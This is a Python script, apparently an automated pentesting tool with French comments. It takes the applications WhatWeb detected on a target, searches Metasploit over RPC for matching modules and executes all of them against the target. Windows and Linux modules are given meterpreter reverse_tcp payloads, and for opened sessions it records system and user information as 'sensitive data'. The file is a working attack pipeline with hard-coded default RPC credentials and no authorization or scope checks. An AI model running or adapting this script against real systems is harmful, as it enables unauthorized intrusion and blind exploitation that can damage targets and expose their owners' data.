from pymetasploit3.msfrpc import MsfRpcClient
import csv
import time
import sys
import os

# Fonction pour charger les applications détectées à partir du fichier CSV de WhatWeb
def load_applications_from_csv(file):
    """
    Charge les applications web détectées à partir du fichier CSV de résultats WhatWeb.
    
    Args:
        file (str): Chemin du fichier CSV des résultats WhatWeb.
        
    Returns:
        list: Liste des applications web détectées.
    """
    apps = []
    with open(file, 'r') as csvfile:
        reader = csv.DictReader(csvfile)
        for row in reader:
            app = row.get('Application')
            if app and app != "Application non identifiée":
                apps.append(app)
    return apps

# Fonction pour rechercher des exploits dans Metasploit en fonction d'un terme de recherche
def search_exploits(client, search_term):
    """
    Recherche des modules d'exploit dans Metasploit en fonction d'un terme donné.
    
    Args:
        client (MsfRpcClient): Instance du client RPC Metasploit.
        search_term (str): Terme de recherche (nom de l'application, etc.).
        
    Returns:
        list: Liste des exploits trouvés.
    """
    results = client.modules.search(search_term)
    return results

# Fonction pour exécuter un exploit spécifique
def execute_exploit(client, module_type, module_name, payload, target_ip):
    """
    Exécute un module d'exploitation dans Metasploit.
    
    Args:
        client (MsfRpcClient): Instance du client RPC Metasploit.
        module_type (str): Type de module (exploit, auxiliary, etc.).
        module_name (str): Nom du module à exécuter.
        payload (str): Nom du payload à utiliser (si applicable).
        target_ip (str): Adresse IP de la cible.
        
    Returns:
        bool, dict: Succès ou échec de l'exploitation, et l'ID de job si succès.
    """
    module = client.modules.use(module_type, module_name)
    
    if 'RHOSTS' in module._moptions:
        module['RHOSTS'] = target_ip

    try:
        if payload and module_type == 'exploit':
            job = module.execute(payload=payload)
        else:
            job = module.execute()

        if job and 'job_id' in job:
            print(f"Module {module_name} exécuté avec succès, Job ID: {job['job_id']}")
            return True, job
        else:
            return True, None
    except Exception as e:
        print(f"Erreur lors de l'exécution du module {module_name}: {e}")
        return False, None

# Fonction pour récupérer les sessions actives et des données sensibles
def get_active_sessions(client):
    """
    Récupère les informations des sessions actives dans Metasploit.
    
    Args:
        client (MsfRpcClient): Instance du client RPC Metasploit.
        
    Returns:
        list: Liste des données sensibles récupérées pour chaque session active.
    """
    sessions = client.sessions.list
    sensitive_data = []
    for session_id, session_info in sessions.items():
        try:
            sysinfo = client.sessions.session(session_id).run_with_output("sysinfo")
            user_info = client.sessions.session(session_id).run_with_output("whoami")
            sensitive_data.append(f"Session {session_id}: sysinfo={sysinfo.strip()}, user={user_info.strip()}")
        except Exception as e:
            sensitive_data.append(f"Session {session_id}: Erreur lors de la récupération des données - {e}")
    return sensitive_data

# Fonction pour sauvegarder les résultats dans un fichier CSV
def save_results_to_csv(results, output_csv_file):
    """
    Enregistre les résultats des exploits dans un fichier CSV.
    
    Args:
        results (list): Liste des résultats d'exploit à enregistrer.
        output_csv_file (str): Chemin du fichier CSV de sortie.
    """
    with open(output_csv_file, 'w', newline='') as csvfile:
        fieldnames = ['Application', 'Module', 'Type', 'Résultat', 'Données sensibles', 'Mesures de sécurité']
        writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
        writer.writeheader()
        for data in results:
            writer.writerow(data)
    print(f"Les résultats de l'exploitation ont été enregistrés dans {output_csv_file}")

# Fonction principale pour gérer le processus d'exploitation
def main():
    """
    Fonction principale qui gère la connexion à Metasploit, l'exécution des exploits,
    et l'enregistrement des résultats dans un fichier CSV.
    """
    if len(sys.argv) != 2:
        print("Usage: python3 exploit_appli.py <target>")
        sys.exit(1)

    target = sys.argv[1]
    whatweb_csv_file = f"whatweb_results_{target}.csv"
    output_csv_file = f"metasploit_app_{target.replace('/', '_').replace(':', '_')}.csv"

    # Connexion au client RPC de Metasploit
    msf_username = 'msf'
    msf_password = 'msf'
    msf_server = '127.0.0.1'
    msf_port = 55553
    client = MsfRpcClient(msf_password, server=msf_server, port=msf_port, username=msf_username, ssl=False)

    applications = load_applications_from_csv(whatweb_csv_file)
    results = []

    for app in applications:
        print(f"Recherche d'exploits pour {app}")
        exploits = search_exploits(client, app)
        if exploits:
            for exploit in exploits:
                module_name = exploit['fullname']
                module_type = exploit['type']
                print(f"Exécution du module {module_name} ({module_type}) pour {app}")
                payload = None
                if 'windows' in module_name:
                    payload = 'windows/meterpreter/reverse_tcp'
                elif 'linux' in module_name:
                    payload = 'linux/x86/meterpreter/reverse_tcp'

                success, job = execute_exploit(client, module_type, module_name, payload, target)
                
                sensitive_data = []
                if success:
                    session_id = None
                    timeout = time.time() + 5  # Timeout de 5 secondes
                    while not session_id and time.time() < timeout:
                        sessions = client.sessions.list
                        if sessions:
                            session_id = list(sessions.keys())[0]
                        time.sleep(5)

                    if session_id:
                        session = client.sessions.session(session_id)
                        sensitive_data = get_active_sessions(client)
                        security_measures = "Aucune mesure de sécurité détectée"
                    else:
                        print(f"Aucune session active n'a été détectée pour {module_name}")
                        security_measures = "Mesures de sécurité détectées"
                else:
                    security_measures = "Mesures de sécurité détectées"

                results.append({
                    'Application': app,
                    'Module': module_name,
                    'Type': module_type,
                    'Résultat': 'réussi' if success else 'échoué',
                    'Données sensibles': "\n".join(sensitive_data) if sensitive_data else "Aucune donnée récupérée",
                    'Mesures de sécurité': security_measures
                })
                print(f"Exploitation {'réussie' if success else 'échouée'} pour le module {module_name} ({module_type})")
        else:
            print(f"Aucun exploit trouvé pour {app}")
            results.append({
                'Application': app,
                'Module': 'Aucun',
                'Type': 'N/A',
                'Résultat': 'échoué',
                'Données sensibles': 'Aucune donnée récupérée',
                'Mesures de sécurité': 'Mesures de sécurité détectées'
            })

    save_results_to_csv(results, output_csv_file)

if __name__ == '__main__':
    main()
